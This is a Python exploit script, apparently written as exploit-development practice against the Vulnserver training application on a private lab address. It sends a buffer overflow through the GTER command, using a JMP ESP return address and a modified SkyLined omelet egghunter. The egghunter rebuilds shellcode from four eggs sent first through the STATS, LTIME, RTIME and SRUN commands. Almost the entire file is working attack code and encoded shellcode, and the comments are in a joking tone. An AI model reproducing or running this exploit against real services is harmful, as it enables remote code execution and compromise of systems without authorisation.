#!/usr/bin/python
import socket

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

connect=s.connect(('192.168.56.101',9999))
# Personal Advice Redo all the omelet compile to not destroy all the jump offsets :)

# First egg is at XXX approx Using kung fu :D
omelet_code = "\x80\xED\x3A" # sub ch,0x3a  To Place ECX just behind our eggs
omelet_code += "\x89\xCF" # MOV EDI,ECX Cause ECX s the closes to our eggs :D
omelet_code += "\x80\xC5\x3A"     # add ch,0x3a Revert changes on ECX clean ninja skills
### More Kung fu to make the jump when the omelet is ready
omelet_code += "\xBB\xFC\xFF\xFF\xFF" # mov ebx,0xfffffffc because we have 4 eggs mov ebx,0xffffffff-egg_size+1

# recombine the orignal shellcode and execute it. It is 85-2 bytes: it is custom modified version of : skylined w32_SEH_omelet.bin
omelet_code += "\xEB\x29\x51\x64\x89\x20\xFC\xB0\x5F\xF2\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x04\x77\x12\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x83\xFB\xFF\x74\x25\x43\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x83\xF9\xFF\x75\xF8\x5A\xE8\xC4\xFF\xFF\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x03\x97\xEB\xDE\x31\xC0\x64\xFF\x50\x08"

#egg0 = "C"+"A"*98+"C"
egg0 = "\x5F\xFF\x55\xDA\xBA\xDA\xD7\xBF\x81\x49\x6C\xF1\xD9\x74\x24\xF4\x5D\x33\xC9\xB1\x52\x83\xC5\x04\x31\x7D\x13\x03\xFC\x5A\x8E\x04\x02\xB4\xCC\xE7\xFA\x45\xB1\x6E\x1F\x74\xF1\x15\x54\x27\xC1\x5E\x38\xC4\xAA\x33\xA8\x5F\xDE\x9B\xDF\xE8\x55\xFA\xEE\xE9\xC6\x3E\x71\x6A\x15\x13\x51\x53\xD6\x66\x90\x94\x0B\x8A\xC0\x4D\x47\x39\xF4\xFA\x1D\x82\x7F\xB0\xB0\x82\x9C\x01\xB2\xA3\x33\x19\xED\x63\xB2\xCE\x85\x2D"

#egg1 = "C"+"A"*98+"C"
egg1 = "\x5F\xFE\x55\xDA\xBA\xAC\x13\xA3\xE4\x47\xE7\x5F\xF7\x81\x39\x9F\x54\xEC\xF5\x52\xA4\x29\x31\x8D\xD3\x43\x41\x30\xE4\x90\x3B\xEE\x61\x02\x9B\x65\xD1\xEE\x1D\xA9\x84\x65\x11\x06\xC2\x21\x36\x99\x07\x5A\x42\x12\xA6\x8C\xC2\x60\x8D\x08\x8E\x33\xAC\x09\x6A\x95\xD1\x49\xD5\x4A\x74\x02\xF8\x9F\x05\x49\x95\x6C\x24\x71\x65\xFB\x3F\x02\x57\xA4\xEB\x8C\xDB\x2D\x32\x4B\x1B\x04\x82\xC3\xE2\xA7\xF3\xCA\x20\xF3"

#egg2 = "C"+"A"*98+"C"
egg2 = "\x5F\xFD\x55\xDA\xBA\xA3\x64\x80\x7C\x28\x74\x2D\xA9\xFF\x24\x81\x02\x40\x94\x61\xF3\x28\xFE\x6D\x2C\x48\x01\xA4\x45\xE3\xF8\x2F\xAA\x5C\x3A\xD6\x42\x9F\x3A\x17\x28\x16\xDC\x7D\x5E\x7F\x77\xEA\xC7\xDA\x03\x8B\x08\xF1\x6E\x8B\x83\xF6\x8F\x42\x64\x72\x83\x33\x84\xC9\xF9\x92\x9B\xE7\x95\x79\x09\x6C\x65\xF7\x32\x3B\x32\x50\x84\x32\xD6\x4C\xBF\xEC\xC4\x8C\x59\xD6\x4C\x4B\x9A\xD9\x4D\x1E\xA6\xFD\x5D\xE6"

#egg3 = "C"+"A"*98+"C"
egg3 = "\x5F\xFC\x55\xDA\xBA\x27\xBA\x09\xB6\x71\x14\xE7\x70\x28\xD6\x51\x2B\x87\xB0\x35\xAA\xEB\x02\x43\xB3\x21\xF5\xAB\x02\x9C\x40\xD4\xAB\x48\x45\xAD\xD1\xE8\xAA\x64\x52\x08\x49\xAC\xAF\xA1\xD4\x25\x12\xAC\xE6\x90\x51\xC9\x64\x10\x2A\x2E\x74\x51\x2F\x6A\x32\x8A\x5D\xE3\xD7\xAC\xF2\x04\xF2\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";

# PAYLOAD LENGHT IS : 2009 with 2000 of A

buf = 'GTER /.:/'
# [*] Exact match at offset 147
buf += "A"*(147-122)
buf += omelet_code
buf += "D"*(122-len(omelet_code)) # OMELET CODE goes here 
#buf += "B"*4
# 62501203
buf += "\x03\x12\x50\x62" # classic JMP ESP somewhere in earth

#buf += "\x90"*2
buf += "\xeb\x80"

buf += "C"*(2000-147-4-2)

print "Fuzzing GTER with %s bytes" % len(buf)
print s.recv(1024)

print "sending first egg with size : %s" % len(egg0)
s.send('STATS ' + egg0 + '\r\n')
print s.recv(1024)

print "sending second egg with size : %s" % len(egg1)
s.send('LTIME ' + egg1 + '\r\n')
print s.recv(1024)

print "sending third egg with size : %s" % len(egg2)
s.send('RTIME ' + egg2 + '\r\n')
print s.recv(1024)

print "sending fourth egg with size : %s" % len(egg3)
s.send('SRUN ' + egg3 + '\r\n')
print s.recv(1024)

print "MAKING AN OMELET with size : %s" % len(omelet_code)

s.send(buf + '\r\n')

print s.recv(1024)

s.close()
